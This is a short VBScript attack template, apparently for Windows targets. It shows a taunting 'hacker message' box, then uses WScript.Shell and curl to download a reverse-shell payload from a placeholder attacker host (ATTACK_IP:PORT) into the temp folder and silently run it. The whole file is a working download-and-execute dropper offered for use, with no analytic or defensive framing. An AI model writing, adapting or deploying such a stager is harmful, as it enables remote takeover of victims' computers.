' a message to appear on target screen
Dim message
message = "Insert Hacker Message Here :)"
MsgBox message
' creating a variable to run system commands
Set objShell = CreateObject("WScript.Shell")
' url to download revshell payload
downloadURL = "http://ATTACK_IP:PORT/payload.exe"
' where to dump the payload
outputFile = "%TEMP%\\payload.exe"
' curl command to download and output the payload
command = "curl """ & downloadURL & """ -o """ & outputFile & """"
' execute the commands
objShell.Run command, false, true
objShell.Run outputFile, false, true
